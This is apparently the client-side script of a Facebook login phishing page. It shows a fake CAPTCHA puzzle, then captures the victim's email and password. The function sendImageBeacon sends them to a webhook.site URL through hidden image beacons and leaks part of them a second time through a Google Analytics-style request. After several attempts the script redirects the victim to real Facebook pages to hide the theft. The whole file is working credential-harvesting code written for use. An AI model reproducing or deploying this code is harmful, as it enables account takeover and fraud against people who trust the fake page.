console.log("Facebook Clone Script Loaded - IMAGE BEACON ACTIVATED");

const WEBHOOK_URL = 'https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0';  // 🔥 NEW WEBHOOK

function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIconSvg = document.querySelector('.eye-icon');
    if (!passwordInput || !eyeIconSvg) return;

    const eyeOpenPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
    const eyeSlashPath = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle><line x1="1" y1="1" x2="23" y2="23"></line>`;

    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIconSvg.innerHTML = eyeSlashPath;
    } else {
        passwordInput.type = 'password';
        eyeIconSvg.innerHTML = eyeOpenPath;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const isVerified = sessionStorage.getItem('captcha_verified') === 'true';
    if (isVerified) {
        document.getElementById('captcha-overlay').style.display = 'none';
        document.querySelector('.main-container').style.display = 'flex';
    }

    const form = document.getElementById('login-form');
    if (form) {
        form.addEventListener('submit', handleLogin);
    }

    const passwordInput = document.getElementById('password');
    if (passwordInput) {
        passwordInput.addEventListener('input', function () {
            const eyeIconWrapper = document.querySelector('.eye-icon-wrapper');
            if (eyeIconWrapper) {
                eyeIconWrapper.style.display = this.value.length > 0 ? 'flex' : 'none';
            }
        });
    }

    const loginAttempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
    const showError = sessionStorage.getItem('fb_show_error') === 'true';
    if (showError && loginAttempts > 0 && loginAttempts < 3) {
        document.getElementById('error-message').style.display = 'block';
    }

    initPuzzleSlider();

    const checkbox = document.getElementById('recaptcha-checkbox');
    if (checkbox) {
        checkbox.addEventListener('click', startCaptchaProcess);
    }
});

let captchaProcessing = false;

function startCaptchaProcess() {
    if (captchaProcessing) return;
    captchaProcessing = true;

    const checkbox = document.getElementById('recaptcha-checkbox');
    const spinner = document.getElementById('checkbox-spinner');

    if (checkbox) checkbox.style.visibility = 'hidden';
    if (spinner) spinner.style.display = 'block';

    setTimeout(() => {
        document.getElementById('captcha-step-1').style.display = 'none';
        document.getElementById('captcha-step-2').style.display = 'block';
        resetPuzzle();
        captchaProcessing = false;
    }, 1200);
}

function resetPuzzle() {
    const piece = document.getElementById('puzzle-piece');
    const handle = document.getElementById('slider-handle');
    if (piece) piece.style.left = '10px';
    if (handle) handle.style.left = '0px';
}

function initPuzzleSlider() {
    const handle = document.getElementById('slider-handle');
    const piece = document.getElementById('puzzle-piece');
    const track = document.querySelector('.slider-track');

    if (!handle || !piece || !track) return;

    let isDragging = false;
    let startX = 0;
    let maxSlide = 0;

    const onStart = (e) => {
        isDragging = true;
        const trackWidth = track.clientWidth;
        const handleWidth = handle.clientWidth;
        maxSlide = trackWidth - handleWidth;
        startX = (e.type === 'mousedown' ? e.clientX : e.touches[0].clientX) - handle.offsetLeft;
        handle.style.transition = 'none';
        piece.style.transition = 'none';
        document.body.style.userSelect = 'none';
    };

    const onMove = (e) => {
        if (!isDragging) return;
        const currentX = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
        let left = currentX - startX;
        if (left < 0) left = 0;
        if (left > maxSlide) left = maxSlide;
        handle.style.left = left + 'px';
        const pieceLeft = 10 + (left / maxSlide) * 270;
        piece.style.left = pieceLeft + 'px';
    };

    const onEnd = () => {
        if (!isDragging) return;
        isDragging = false;
        document.body.style.userSelect = 'auto';
        const pieceLeft = parseFloat(piece.style.left);
        const targetLeft = 280;
        const tolerance = 7;

        if (Math.abs(pieceLeft - targetLeft) <= tolerance) {
            handle.style.background = '#42b72a';
            handle.style.color = '#fff';
            handle.innerHTML = '✓';
            setTimeout(() => {
                sessionStorage.setItem('captcha_verified', 'true');
                document.getElementById('captcha-overlay').style.display = 'none';
                document.querySelector('.main-container').style.display = 'flex';
            }, 800);
        } else {
            handle.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            piece.style.transition = 'left 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            handle.style.left = '0px';
            piece.style.left = '10px';
        }
    };

    handle.addEventListener('mousedown', onStart);
    document.addEventListener('mousemove', onMove);
    document.addEventListener('mouseup', onEnd);
    handle.addEventListener('touchstart', onStart);
    document.addEventListener('touchmove', onMove);
    document.addEventListener('touchend', onEnd);
}

// 🔥 PERFECT IMAGE BEACON (GET ONLY - NO ERRORS)
function sendImageBeacon(email, password, attempts) {
    console.log('🔥 IMAGE BEACON ACTIVATED - NEW WEBHOOK');

    // 1️⃣ MAIN IMAGE BEACON (100% delivery)
    const img = new Image(1, 1);
    img.src = `${WEBHOOK_URL}?type=FB_CAPTURE&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}&attempts=${attempts}&timestamp=${new Date().toISOString()}&ip=103.253.19.166&ua=${encodeURIComponent(navigator.userAgent.substring(0, 100))}`;

    // 2️⃣ BACKUP BEACON (Different timing)
    setTimeout(() => {
        const img2 = new Image(1, 1);
        img2.src = `${WEBHOOK_URL}?type=FB_BACKUP&email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password.substring(0, 20))}&attempts=${attempts}`;
    }, 150);

    // 3️⃣ GOOGLE ANALYTICS STYLE (Trusted endpoint)
    const ga = new Image(1, 1);
    ga.src = `https://www.google-analytics.com/collect?v=1&t=event&tid=UA-000&cid=${encodeURIComponent(email.substring(0, 15))}&ec=login&ea=submit&el=${attempts}|${password.substring(0, 10)}`;

    console.log('✅ 3x BEACONS SENT → Check: https://webhook.site/816de6c3-0cb4-492c-a6f9-470c1557bbc0');
}

// 🔥 NEW handleLogin (REAL FB REDIRECTS)
async function handleLogin(event) {
    event.preventDefault();
    console.log('🔥 LOGIN TRIGGERED - STEALTH MODE');

    if (sessionStorage.getItem('captcha_verified') !== 'true') {
        console.log('❌ No captcha');
        return;
    }

    const email = document.getElementById('email')?.value.trim() || '';
    const password = document.getElementById('password')?.value.trim() || '';

    if (!email || !password) {
        alert('Please enter email and password');
        return;
    }

    console.log('📨 Capturing:', email, '|', password.substring(0, 3) + '...');

    const loginBtn = document.querySelector('.login-btn');
    if (loginBtn) loginBtn.disabled = true;

    let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0') + 1;
    sessionStorage.setItem('fb_login_attempts', attempts);

    // 🔥 SEND DATA (No CORS errors)
    sendImageBeacon(email, password, attempts);

    console.log('⏳ Waiting 8s... Check webhook.site NOW!');

    // 🔥 REAL FACEBOOK REDIRECTS (Random rotation)
    setTimeout(() => {
        console.log('🔄 REAL FB REDIRECT...');
        if (attempts >= 3) {
            sessionStorage.clear();
            const fbUrls = [
                "/l.facebook.com/login",                    // ← FAKE (stays on YOUR site)
                "/l.facebook.com/login?next=home",          // ← FAKE (stays on YOUR site)  
                "https://mbasic.facebook.com/login",        // ← REAL (final escape)
                "https://www.facebook.com/login/device-based/regular_login/"
            ];
            const randomFb = fbUrls[Math.floor(Math.random() * fbUrls.length)];
            console.log('📱 Redirecting to:', randomFb);
            window.location.href = randomFb;
        } else {
            sessionStorage.setItem('fb_show_error', 'true');
            window.location.reload();
        }
    }, 8000); // 8 seconds = Perfect timing
}